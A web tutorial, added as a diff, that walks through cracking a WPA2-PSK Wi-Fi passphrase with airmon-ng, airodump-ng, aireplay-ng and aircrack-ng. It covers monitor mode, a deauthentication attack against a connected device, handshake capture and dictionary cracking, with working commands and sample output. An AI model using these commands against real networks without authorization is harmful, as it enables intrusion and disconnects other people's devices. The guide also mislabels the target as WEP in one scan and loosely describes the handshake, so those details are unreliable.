@@ -1,0 +1,68 @@
+<main><section class="utils_articlePage__sM9Xw"><h1>Cracking WPA2</h1>
+<p>Make sure you've completed the <a href="/docs/wifi">initial setup</a> before continuing to use the commands on the rest of this page.</p>
+<p>Some commands require root to run. If using Kali, you don't need to worry as you're running as root anyway, if not it might be worth elevating to root on your system.</p>
+<h2>Enable Monitor Mode</h2>
+<p>You need to enable monitor mode on your wireless interface in order for it to send and receive the packets required for the rest of the attack.</p>
+<p>See what devices you have on your system with:</p>
+<pre><code># airmon-ng
+PHY	    Interface	Driver		Chipset
+phy0	wlo1		iwlwifi		Intel Corporation Wireless 7260 (rev 73)</code></pre>
+<p>Our WiFi card has is the <code>wlo1</code> interface. So now we need to enable monitor mode on this interface.</p>
+<pre><code># airmon-ng start wlo1
+PHY	    Interface	Driver		Chipset
+phy0	wlo1		iwlwifi		Intel Corporation Wireless 7260 (rev 73)
+
+            (mac80211 monitor mode vif enabled for [phy0]wlo1 on [phy0]wlo1mon)
+            (mac80211 station mode vif disabled for [phy0]wlo1)</code></pre>
+<p>You might get a warning message saying <code>Found 5 processes that could cause trouble.</code> everything should probably be okay and work fine anyway.</p>
+<p>Now if you list the interfaces again:</p>
+<pre><code># airmon-ng
+PHY  	Interface	Driver		Chipset
+phy0	wlo1mon		iwlwifi		Intel Corporation Wireless 7260 (rev 73)</code></pre>
+<p>Notice how the interface name has changed from <code>wlo1</code> to <code>wlo1mon</code>.
+Now we're ready to start investigating our target WiFi network.</p>
+<h2>Scan Surrounding Networks</h2>
+<p>After we've setup our WiFi interface, we need to scan for our target WiFi network to determine it's ESSID and the channel it's broadcasting on.</p>
+<p>Start the following command and it will start looking for available networks and retrieve information about them. Once you've seen your target network show up you can stop the scanning with <code>Ctrl-c</code>. In this snippet, irrelevant data has been cut out and replaced with <code>[...]</code>. You will likely see quite a few networks here.</p>
+<pre><code># airodump-ng wlo1mon
+    CH  X ][ Elapsed: 0 s ][ 2017-01-01 00:00                                        
+                                                                                                                                                                        
+    BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+                                                                                                                                                                        
+    [...]                                                                                 
+    00:18:4D:67:1C:84  -38        5        0    0  11  54 . WEP  WEP         HackMe
+    [...]                                                                                    
+                                                                                                                                                
+    BSSID              STATION            PWR   Rate    Lost    Frames  Probe
+    [...]</code></pre>
+<p>From this, what we're interested in is the <code>BSSID</code>, <code>CH</code>, <code>ENC</code>, <code>AUTH</code> and<code>ESSID</code> columns.</p>
+<p>The <code>BSSID</code> and <code>ESSID</code> values identify our target network, in this guide, we'll be using the <code>ESSID</code> value but we could change the parameters to use the <code>BSSID</code> if we wanted.</p>
+<p>The <code>CH</code> value is the radio channel the target network is broadcasting on. We'll need this later when performing our attack.</p>
+<p>The <code>ENC</code> value is the encryption type used by the network to protect access and traffic. For this guide the encryption type needs to be WPA2. We also need the <code>AUTH</code> value, which is the authentication method, to be PSK.</p>
+<h2>Launching the Attack</h2>
+<p>When a device authenticates to a WPA2 PSK network, it sends a hashed copy of the network passphrase to the access point broadcasting the target network. Even if previously authenticated, when it reconnects to a network after having disconnected, the device will send the hashed passphrase. We need to capture that hash so we can then crack it and recover the passphrase.</p>
+<p>In order to capture the data we need, we need to sniff the traffic of a device authenticating to the network. The best way to do this is to broadcast packets to a device which is already connected to the network, to tell it that it's been disconnected. When the device receives this disconnection data it will try to re-authenticate to the network, sending the hash that we want in the 4-way connection handshake.</p>
+<p>We need to select a victim device to disconnect and also sniff the handshake, both of these can be done like so:</p>
+<pre><code># airodump-ng wlo1mon --channel 11 --essid HackMe -w wpa2-cracking
+    CH X ][ Elapsed: X mins ][ 2017-01-01 00:00                                         
+                                                                                                                                                                        
+    BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+                                                                                                                                                                        
+    00:18:4D:67:1C:84  -31 100     1773      849    0  11  54e. WPA2 CCMP   PSK  HackMe                                                                       
+                                                                                                                                                                        
+    BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                             
+                                                                                                                                                                        
+    00:18:4D:67:1C:84  00:11:22:33:44:55  -27    1 - 1e     0      268  VictimDevice
+    00:18:4D:67:1C:84  66:77:88:99:AA:BB  -48    1 - 6      0       13  AnotherDevice</code></pre>
+<p>In the lower section we can see a list of devices connected to our target network. We're going to pick one to disconnect. For this guide we'll use VictimDevice. While leaving the command above still running, open up a new terminal session and issue a disconnect to the victim.</p>
+<p>We need the victim's MAC address: <code>00:11:22:33:44:55</code> and the BSSID of the access point broadcasting the target network: <code>00:18:4D:67:1C:84</code>.</p>
+<pre><code># aireplay-ng -0 1 -a 00:18:4D:67:1C:84 -c 00:11:22:33:44:55 wlo1mon
+19:32:36  Waiting for beacon frame (BSSID: 00:18:4D:67:1C:84) on channel 11
+19:32:36  Sending 64 directed DeAuth. STMAC: [00:11:22:33:44:55] [ 0| 0 ACKs]</code></pre>
+<p>Going back to the <code>airodump-ng</code> command we left running, we should see the reconnect handshake has been captured.</p>
+<h2>Recovering the Passphrase</h2>
+<p>Finally we need to recover the passphrase from the hash. If the passphrase is complex or you want to crack it quickly you'll want to look into cracking it with a high performance tool like HashCat but that's beyond the scope of this guide.</p>
+<p>In this guide we'll use a password dictionary (Kali has many included) and the cracking tools built into <code>aircrack-ng</code>, like so:</p>
+<pre><code># aircrack-ng -w dictionary.txt -b 00:18:4D:67:1C:84 wpa2-cracking-01.cap</code></pre>
+<p>The MAC address above is the BSSID of the target network.</p>
+</section></main>
